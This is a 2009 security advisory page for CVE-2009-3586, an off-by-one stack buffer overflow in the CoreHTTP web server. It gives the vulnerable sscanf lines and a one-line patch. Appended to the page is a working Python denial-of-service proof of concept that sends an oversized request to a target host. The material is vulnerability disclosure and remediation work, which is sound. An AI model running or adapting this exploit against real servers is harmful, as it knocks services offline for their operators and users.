=== Content from census-labs.com_e8d075a7_20250124_210857.html ===


[![CENSUS | Cybersecurity Engineering](/static/assets/img/logos/logo.png)](/)

* [BLOG](/news/category/blog/)
* [ADVISORIES](/news/category/advisories/)
* [CAREERS](/openings/)

* [INDUSTRIES](/industries/)
* [SERVICES](/services/)
* [NEWS](/news/category/census/)
* [LABS](/labs/)
* [COMPANY](/census/)
* [CONTACT](/contact/)

POSTED BY:
[Patroklos Argyroudis](/cdn-cgi/l/email-protection#4d2c3f2a3d0d2e28233e383e60212c2f3e632e2220)
/
02.12.2009

# CoreHTTP web server off-by-one buffer overflow vulnerability

| CENSUS ID: | CENSUS-2009-0003 |
| --- | --- |
| CVE ID: | [CVE-2009-3586](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3586) |
| Affected Products: | CoreHTTP web server versions ≤ 0.5.3.1. |
| Class: | Improper Input Validation ([CWE-20](http://cwe.mitre.org/data/definitions/20.html)), Failure to Constrain Operations within the Bounds of a Memory Buffer ([CWE-119](http://cwe.mitre.org/data/definitions/119.html)) |
| Remote: | Yes |
| Discovered by: | Patroklos Argyroudis |

We have discovered a remotely exploitable “improper input validation” vulnerability in the CoreHTTP web server that leads to an off-by-one stack buffer overflow. The vulnerability can lead to denial of service attacks against the web server and potentially to the remote execution of arbitrary code with the privileges of the user running the server.

### Details

[CoreHTTP](http://corehttp.sourceforge.net/) is a minimalist web server focusing on speed and size. More information about its features can be found
[here](http://corehttp.sourceforge.net/man.html).

CoreHTTP (up to and including version 0.5.3.1) employs an insufficient input validation method for handling HTTP requests with invalid method names and URIs. Specifically, the vulnerability is an off-by-one buffer overflow in the sscanf() call at file src/http.c line numbers 45 and 46:

```
45:    sscanf(parentsprock->buffer,
46:        "%" PATHSIZE_S "[A-Za-z] %" PATHSIZE_S "s%*[ \t\n]", req, url);

```

The buffers req and url are declared to be of size 256 bytes (PATHSIZE) and the sscanf() call writes 256 bytes (PATHSIZE\_S) to these buffers without NULL terminating them.

Note that this is not vulnerability
[CVE-2007-4060](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4060) in which the same sscanf() call contained no bounds check at all.

This vulnerability can lead to denial of service attacks against the CoreHTTP web server and potentially to the remote execution of arbitrary code with the privileges of the user running the server. We have developed [a proof-of-concept exploit](/media/corex.txt) to demonstrate the vulnerability.

To address the problem we propose the following unofficial patch (download it from [here](/media/corehttp-0.5.3.1-patch.txt)), since CoreHTTP’s author has not released an official fix yet:

```
--- corehttp/src/common.h.orig  2009-12-01 09:29:18.000000000 +0200
+++ corehttp/src/common.h       2009-12-01 09:31:47.000000000 +0200
@@ -36,7 +36,7 @@
 #define BUFSIZE                2048
 #define BUFSIZE_S      "2048"
 #define PATHSIZE       256
-#define PATHSIZE_S     "256"
+#define PATHSIZE_S     "255"
 #define        SETSIZE         16

 #ifndef GLOBALS_DEFINED

```

* Tags:
  [advisories](/news/tag/advisories/)
  ,
  [buffer overflow](/news/tag/buffer-overflow/)
  ,
  [corehttp](/news/tag/corehttp/)
  ,
  [research](/news/tag/research/)
  ,
  [vulnerability](/news/tag/vulnerability/)

##### Share this

* [twitter](https://twitter.com/home?status=http%3A//127.0.0.1%3A8000/blog/oracle-webcent-information-exposure-vulnerability-4/%20CoreHTTP%20web%20server%20off-by-one%20buffer%20overflow%20vulnerability)
* [facebook](https://facebook.com/sharer.php?u=https://census-labs.com/news/2009/12/02/corehttp-web-server/&t=CoreHTTP%20web%20server%20off-by-one%20buffer%20overflow%20vulnerability)
* [reddit](https://reddit.com/submit?url=https://census-labs.com/news/2009/12/02/corehttp-web-server/)
* [google+](https://plus.google.com/u/0/share?url=https://census-labs.com/news/2009/12/02/corehttp-web-server/)
* [email](/cdn-cgi/l/email-protection#142b326761767e71776029577b66715c4040443126246371763126246771666271663126247b727239766d397b7a713126247661727271663126247b62716672787b633126246261787a716675767d787d606d32767b706d2931275760757678713127513124503124553127576066312751312757607031275157515a4741473126245d503127553127573b6070312751312757607031275157515a474147392624242d39242424273127573b60703127513127573b6066312751312450312455312757606631275131275760703127515742513126245d503127553127573b60703127513127576070312751312757753126247c6671723127503126267c6060643127553b3b7762713a797d6066713a7b66733b77737d39767d7a3b7762717a7579713a77737d3127527a757971312750574251392624242d3927212c22312626312751574251392624242d3927212c223127573b753127513127573b60703127513127573b606631275131245031245531245031245531275760663127513127576070312751557272717760717031262444667b70617760673127553127573b60703127513127576070312751577b66715c404044312624637176312624677166627166312624627166677d7b7a673126243126243126227871312756312624243a213a273a253a3127573b60703127513127573b60663127513124503124553124503124553127576066312751312757607031275157787567673127553127573b607031275131275760703127515d7964667b6471663126245d7a6461603126244275787d7075607d7b7a31262431262c312757753126247c6671723127503126267c6060643127553b3b7763713a797d6066713a7b66733b707560753b7071727d7a7d607d7b7a673b26243a7c6079783126263127515743513926243127573b7531275131262d31265731262452757d78616671312624607b312624577b7a676066757d7a3126245b64716675607d7b7a67312624637d607c7d7a312624607c71312624567b617a70673126247b72312624753126245971797b666d31262456617272716631262431262c312757753126247c6671723127503126267c6060643127553b3b7763713a797d6066713a7b66733b707560753b7071727d7a7d607d7b7a673b25252d3a7c6079783126263127515743513925252d3127573b7531275131262d3127573b60703127513127573b6066312751312450312455312450312455312757606631275131275760703127514671797b60713127553127573b607031275131275760703127514d71673127573b60703127513127573b606631275131245031245531275760663127513127576070312751507d67777b6271667170312624766d3127553127573b60703127513127576070312751447560667b7f787b673126245566736d667b61707d673127573b60703127513127573b60663127513124503124553127573b60757678713127513124503124553124503124553127576431275131245031245543713126247c756271312624707d67777b6271667170312624753126246671797b6071786d312624716c64787b7d60757678713126243126223126272c2626243127567d7964667b6471663126247d7a6461603126246275787d7075607d7b7a3126223126272c2626253127563126246261787a716675767d787d606d3126247d7a312624607c71312624577b66715c404044312624637176312624677166627166312624607c75603126247871757067312624607b312624757a3126247b727239766d397b7a71312624676075777f3126247661727271663126247b62716672787b633a312624407c713126246261787a716675767d787d606d31262477757a31262478717570312624607b31262470717a7d75783126247b72312624677166627d777131262475606075777f673126247573757d7a6760312624607c71312624637176312624677166627166312624757a70312624647b60717a607d7578786d312624607b312624607c713126246671797b6071312624716c717761607d7b7a3126247b723126247566767d606675666d312624777b7071312624637d607c312624607c7131262464667d627d78717371673126247b72312624607c713126246167716631262466617a7a7d7a73312624607c713126246771666271663a3124503124553127573b643127513124503124553124503124553127573126253939797b667139393127513124503124553124503124553127577c27312751507160757d78673127573b7c2731275131245031245531245031245531275764312751312450312455312757753126247c6671723127503126267c6060643127553b3b777b66717c6060643a677b61667771727b6673713a7a71603b312626312751577b66715c4040443127573b753127513126247d6731262475312624797d7a7d7975787d6760312624637176312624677166627166312624727b7761677d7a733126247b7a3126246764717170312624757a70312624677d6e713a312624597b66713126247d7a727b667975607d7b7a31262475767b61603126247d6067312624727175606166716731262477757a3126247671312624727b617a70312450312455312757753126247c6671723127503126267c6060643127553b3b777b66717c6060643a677b61667771727b6673713a7a71603b79757a3a7c6079783126263127517c7166713127573b753127513a3124503124553127573b6431275131245031245531245031245531275764312751312450312455577b66715c40404431262431262c6164312624607b312624757a703126247d7a777861707d7a73312624627166677d7b7a312624243a213a273a2531262d312624717964787b6d67312624757a3126247d7a676172727d777d717a603126247d7a6461603126246275787d7075607d7b7a3126247971607c7b70312624727b663126247c757a70787d7a733126245c4040443126246671656171676067312624637d607c3126247d7a6275787d703126247971607c7b703126247a75797167312624757a7031262441465d673a312624476471777d727d777578786d312657312624607c713126246261787a716675767d787d606d3126247d67312624757a3126247b727239766d397b7a713126247661727271663126247b62716672787b633126247d7a312624607c713126243127576060312751676777757a7231262c31262d3127573b6060312751312624777578783126247560312624727d787131262431275760603127516766773b7c6060643a773127573b6060312751312624787d7a713126247a6179767166673126242021312624757a7031262420223127553124503124553127573b64312751312450312455312450312455312757646671312751312757777b707131262477787567673127503126267764643126263127512021312755312624312624312624312624676777757a7231262c647566717a606764667b777f3931275176617272716631265731245031245520223127553126243126243126243126243126243126243126243126243126263126213126263126244455405c475d4e514b4731262431262631215655394e75396e3121503126243126213126263126244455405c475d4e514b4731262431262667312621312655312156312624312157603121577a31215031262631265731262466716531265731262461667831262d3127563124503124553127573b777b70713127513127573b64667131275131245031245531245031245531275764312751312450312455407c713126247661727271666731262431275760603127516671653127573b6060312751312624757a7031262431275760603127516166783127573b60603127513126247566713126247071777875667170312624607b31262476713126247b72312624677d6e71312624262122312624766d60716731262431262c31275760603127514455405c475d4e513127573b606031275131262d312624757a70312624607c713126243127576060312751676777757a7231262c31262d3127573b60603127513126247775787831262463667d607167312624262122312624766d60716731262431262c31275760603127514455405c475d4e514b473127573b606031275131262d312624607b312624607c71677131262476617272716667312624637d607c7b61603126245a415858312624607166797d7a75607d7a73312624607c71793a3124503124553127573b64312751312450312455312450312455312757643127513124503124555a7b6071312624607c7560312624607c7d673126247d673126247a7b603126246261787a716675767d787d606d312450312455312757753126247c6671723127503126267c6060643127553b3b7762713a797d6066713a7b66733b77737d39767d7a3b7762717a7579713a77737d3127527a75797131275057425139262424233920242224312626312751574251392624242339202422243127573b753127513126247d7a312624637c7d777c312624607c71312624677579713126243127576060312751676777757a7231262c31262d3127573b606031275131262477757878312624777b7a60757d7a71703126247a7b312624767b617a7067312624777c71777f31262475603126247578783a3124503124553127573b6431275131245031245531245031245531275764312751312450312455407c7d673126246261787a716675767d787d606d31262477757a31262478717570312624607b31262470717a7d75783126247b72312624677166627d777131262475606075777f673126247573757d7a6760312624607c71312624577b66715c404044312624637176312624677166627166312624757a70312624647b60717a607d7578786d312624607b312624607c713126246671797b6071312624716c717761607d7b7a3126247b723126247566767d606675666d312624777b7071312624637d607c312624607c7131262464667d627d78717371673126247b72312624607c713126246167716631262466617a7a7d7a73312624607c713126246771666271663a31262443713126247c75627131262470716271787b647170312624312757753126247c6671723127503126263b7971707d753b777b66716c3a606c603126263127517531262464667b7b72397b7239777b7a77716460312624716c64787b7d603127573b75312751312624607b3126247071797b7a676066756071312624607c713126246261787a716675767d787d606d3a3124503124553127573b6431275131245031245531245031245531275764312751312450312455407b31262475707066716767312624607c7131262464667b76787179312624637131262464667b647b6771312624607c71312624727b78787b637d7a73312624617a7b72727d777d7578312624647560777c31262431262c707b637a787b75703126247d6031262472667b79312624312757753126247c6671723127503126263b7971707d753b777b66717c60606439243a213a273a2539647560777c3a606c603126263127517c7166713127573b7531275131262d312657312624677d7a7771312624577b66715c4040443126223126272c262523312756673126247561607c7b663126247c75673126247a7b603126246671787175677170312624757a3126247b72727d777d7578312624727d6c3126246d71603127553124503124553127573b64312751312450312455312450312455312757646671312751312757777b70713126247778756767312750312626776464312626312751393939312624777b66717c6060643b6766773b777b79797b7a3a7c3a7b667d733126243126242624242d392526392425312624242d312755262d312755252c3a24242424242424242431262431265624262424312450312455312656312656312656312624777b66717c6060643b6766773b777b79797b7a3a7c3126243126243126243126243126243126243126242624242d392526392425312624242d312755272531275520233a24242424242424242431262431265624262424312450312455312024312024312624392722312657233126243126562722312657233126243120243120243124503124553126243126277071727d7a71312624564152475d4e513126243126243126243126243126243126243126243126243126243126243126243126243126243126243126243126242624202c3124503124553126243126277071727d7a71312624564152475d4e514b473126243126243126243126243126243126243126262624202c3126263124503124553126243126277071727d7a713126244455405c475d4e51312624312624312624312624312624312624312624262122312450312455393126277071727d7a713126244455405c475d4e514b473126243126243126243126243126243126262621223126263124503124553126563126277071727d7a713126244455405c475d4e514b473126243126243126243126243126243126262621213126263124503124553126243126277071727d7a71312624312624312624312624312624312624312624312624475140475d4e5131262431262431262431262431262431262431262431262431262425223124503124553124503124553126243126277d727a70717231262453585b565558474b5051525d5a51503124503124553127573b777b70713127513127573b646671312751312450312455)
* print+

#### LATEST ADVISORIES

* [Weak SVG asset filtering mechanism in Squidex](/news/2023/11/08/weak-svg-asset-filtering-mechanism-in-squidex-cms/)
* [Race condition in key creation and key rotation exposes private keys of Tang server](/news/2023/06/15/race-tang/)
* [Reflected XSS vulnerabilities in Squidex "/squid.svg" endpoint](/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/)
* [Multiple vulnerabilities in Snipe-IT](/news/2022/12/23/multiple-vulnerabilities-in-snipe-it/)
* [Multiple vulnerabilities in radare2](/news/2022/05/24/multiple-vulnerabilities-in-radare2/)

## IN THE NEWS

* New WhatsApp Bugs Could've Let Attackers Hack Your Phone Remotely ([The Hacker News](https://thehackernews.com/2021/04/new-whatsapp-bug-couldve-let-attackers.html), [Riscure Security Highlights](https://www.riscure.com/blog/security-highlight-how-hackers-obtain-remote-code-execution-in-whatsapp))
* [Mayo
  Clinic lists CENSUS in recommended external assessors list](https://census-labs.com/news/2018/06/05/census-listed-in-mayo-clinics-recommended-external-assessors-list/)
  (announcement)
* [Microsoft
  Turns Off Wi-Fi Sense After Risk Revealed](http://www.bankinfosecurity.com/blogs/microsoft-flicks-off-wi-fi-sense-after-attack-revealed-p-2462)
  (BANK INFO SECURITY)
* NBG Business Seeds Partnership with CENSUS ([National Bank of
  Greece](https://www.nbg.gr/greek/the-group/press-office/press-releases/Pages/sinergasia-nbg-seeds-census.aspx), [ERT](https://int.ert.gr/nbg-business-seeds-announces-cooperation-with-census/),
  [FORTUNE
  Greece](http://www.fortunegreece.com/article/ethniki-trapeza-ke-census-enonoun-tis-dinamis-tous-gia-tin-neofii-epichirimatikotita/))
* [Security By
  Design](http://www.netweek.gr/default.asp?pid=9&la=1&cID=5&arId=31837) (NETWEEK, in greek)
* [Wifiphisher:
  Automating Phishing Attacks Against WiFi Networks](http://www.tripwire.com/state-of-security/off-topic/wifiphisher-automating-phishing-attacks-against-wifi-networks/)
  (Tripwire)
* [DEFCON
  22: Hacking Airports, Airplanes and Airwaves](https://web.archive.org/web/20150703133728/https%3A//www.tripwire.com/state-of-security/vulnerability-management/defcon-22-hacking-airports-airplanes-and-airwaves/) (Tripwire - Internet Archive)

 Company News

* [6th CYBERSECURITY FINANCIAL SERVICES SUMMIT 2023](/news/2023/12/05/6th-cybersecurity-financial-services-summit-2023/)
* [AUTOTECH EUROPE 2023](/news/2023/12/04/autotech-europe-2023/)
* [18⁰ IT Directors Forum](/news/2023/10/16/18th-it-directors-forum/)

 Advisories

* [Weak SVG asset filtering mechanism in Squidex](/news/2023/11/08/weak-svg-asset-filtering-mechanism-in-squidex-cms/)
* [Race condition in key creation and key rotation exposes private keys of Tang server](/news/2023/06/15/race-tang/)
* [Reflected XSS vulnerabilities in Squidex "/squid.svg" endpoint](/news/2023/03/16/reflected-xss-vulnerabilities-in-squidex-squidsvg-endpoint/)

 Blog

* [Introducing Janus: a hierarchical multi-blockchain access control system for policy based access to shared resources](/news/2022/06/21/janus-hmbac/)
* [Securing the building blocks of embedded software](/news/2021/08/31/securing-the-building-blocks-of-embedded-software/)
* [Remote exploitation of a man-in-the-disk vulnerability in WhatsApp (CVE-2021-24027)](/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)

* [Privacy Policy](/policy)
* [Terms of Use](/terms)
* [RSS](/news/feeds/rss/)

Copyright © 2008 - 2025 CENSUS S.A. All rights reserved. Powered
by [d4digital](http://www.d4digital.gr) /
Designed by [B612 Design Office](http://www.b612.gr)

![](https://px.ads.linkedin.com/collect/?pid=7187625&fmt=gif)



=== Content from census-labs.com_2fe6ce09_20250124_210856.html ===
#!/usr/bin/env python
# corex.py -- Patroklos Argyroudis, argp at domain census-labs.com
#
# Denial of service exploit for CoreHTTP web server version <= 0.5.3.1:
#
# http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3586
#
# For a detailed analysis see:
#
# http://census-labs.com/news/2009/12/02/corehttp-web-server/
import os
import sys
import socket
def main(argv):
argc = len(argv)
if argc != 3:
print "usage: %s  " % (argv[0])
sys.exit(0)
host = argv[1]
port = int(argv[2])
print "[\*] target: %s:%d" % (host, port)
payload = "A" \* 257 + "/index.html HTTP/1.1\r\n\r\n"
print "[\*] payload: %s" % (payload)
sd = socket.socket(socket.AF\_INET, socket.SOCK\_STREAM)
sd.connect((host, port))
sd.send(payload)
sd.close()
if \_\_name\_\_ == "\_\_main\_\_":
main(sys.argv)
sys.exit(0)
# EOF

